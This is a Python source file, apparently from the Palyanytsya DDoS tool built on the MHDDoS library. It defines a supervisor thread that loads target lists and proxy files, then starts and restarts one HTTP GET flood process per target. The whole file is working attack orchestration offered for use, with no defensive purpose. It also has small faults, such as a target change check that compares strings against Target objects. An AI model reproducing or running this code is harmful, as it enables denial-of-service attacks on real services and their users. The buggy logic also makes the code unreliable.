import time
from dataclasses import dataclass
from multiprocessing import Queue, Process
from threading import Thread
from typing import List

import psutil

from MHDDoS.start import attack
from MHDDoS.utils.config_files import read_configuration_file_lines
from MHDDoS.utils.proxies import load_proxies
from MHDDoS.utils.targets import Target
from utils.input_args import Arguments
from utils.logs import logger
from utils.misc import TimeInterval


@dataclass
class AttackSupervisorState:
    is_fetching_configuration: bool
    is_fetching_proxies: bool
    attack_processes_count: int


class AttackSupervisor(Thread):
    """Thread which controls the state of the attack processes in Palyanytsya."""

    _args: Arguments
    _attacks_state_queue: Queue
    _supervisor_state_queue: Queue

    _targets: List[Target]
    _targets_fetch_interval: TimeInterval
    _proxies_addresses: List[str]
    _proxies_fetch_interval: TimeInterval
    _attack_processes: List[Process]

    _internal_loop_sleep_interval: float = 0.1

    def __init__(self,
                 args: Arguments,
                 attacks_state_queue: Queue,
                 supervisor_state_queue: Queue):
        Thread.__init__(self, daemon=True)

        self._args = args
        self._attacks_state_queue = attacks_state_queue
        self._supervisor_state_queue = supervisor_state_queue

        self._targets = []
        self._targets_fetch_interval = TimeInterval(args.config_fetch_interval)
        self._proxies_addresses = []
        self._proxies_fetch_interval = TimeInterval(args.proxies_fetch_interval)
        self._attack_processes = []

        logger.info("Starting attack supervisor...")

    def run(self) -> None:
        while True:
            targets_changed = self._fetch_targets()
            proxies_changed = self._fetch_proxies()

            if targets_changed or proxies_changed:
                self._restart_attacks()

            time.sleep(self._internal_loop_sleep_interval)

    def _restart_attacks(self) -> None:
        # TODO: apply CPU usage limit to attack processes?
        cpu_count = psutil.cpu_count()
        targets_count = len(self._targets)
        cpu_per_target = float(cpu_count) / targets_count

        # kill all existing attack processes
        for process in self._attack_processes:
            process.kill()

        # launch attack process for every target
        for target in self._targets:
            attack_method = "GET"  # TODO: support multiple attack methods!
            attack_process = Process(
                target=attack,
                kwargs={
                    "target": target,
                    "attack_method": attack_method,
                    "proxies_file_path": self._args.proxies,
                    "attack_state_queue": self._attacks_state_queue,
                },
                daemon=True
            )
            self._attack_processes.append(attack_process)
            attack_process.start()

    def _collect_attack_states(self) -> None:
        pass

    def _fetch_targets(self) -> bool:
        """
        Fetches targets configuration.

        Returns:
            True if targets have changed, False otherwise.
        """
        if not self._targets_fetch_interval.check_if_has_passed():
            return False

        logger.info("Fetching targets...")

        config = self._args.config

        new_targets_strings: List[str] = []
        new_targets_strings.extend(self._args.targets)
        if config:
            new_targets_strings.extend(read_configuration_file_lines(config))

        new_targets: List[Target] = []
        for target_string in new_targets_strings:
            target = Target.parse_from_string(target_string)
            if not target:
                continue
            elif target.is_valid():
                new_targets.append(target)
                print(f"target: '{target}'")
            else:
                logger.error(f"Target '{target}' is not valid. Will not attack this one.")

        # check if the targets changed
        if self._compare_lists(new_targets_strings, self._targets):
            logger.info("Targets have not changed.")
            return False

        self._targets = new_targets
        logger.info(f"Targets updated. Attack processes will be re-initialized for {len(new_targets)} loaded targets.")
        return True

    def _fetch_proxies(self) -> bool:
        """
        Fetches proxies configuration.

        Returns:
            True if proxies have changed, False otherwise.
        """
        proxies_file_path = self._args.proxies
        if proxies_file_path is None:
            return False
        if not self._proxies_fetch_interval.check_if_has_passed():
            return False

        logger.info("Fetching proxies...")

        new_proxies = load_proxies(proxies_file_path)
        if new_proxies is None:
            logger.error(f"Could not load any proxies from the given path: '{proxies_file_path}'")
            return False

        # check if the proxies changed (we compare the addresses because Proxy objects do not have __eq__ method defined)
        new_proxies_addresses = [f"{p}" for p in new_proxies]
        if self._compare_lists(new_proxies_addresses, self._proxies_addresses):
            logger.info("Proxies have not changed.")
            return False

        self._proxies_addresses = new_proxies_addresses
        logger.info(f"Proxies updated. Attack processes will be re-initialized for {len(new_proxies_addresses)} loaded proxies.")
        return True

    @staticmethod
    def _compare_lists(list_a: List, list_b: List) -> bool:
        """
        Compares in two lists have the same items.
        The lists get sorted in-place before the comparison.

        Args:
            list_a: The 1st list.
            list_b: The 2nd list.

        Returns:
            True if all items in the lists are identical, False otherwise.
        """
        list_a.sort()
        list_b.sort()
        return list_a == list_b

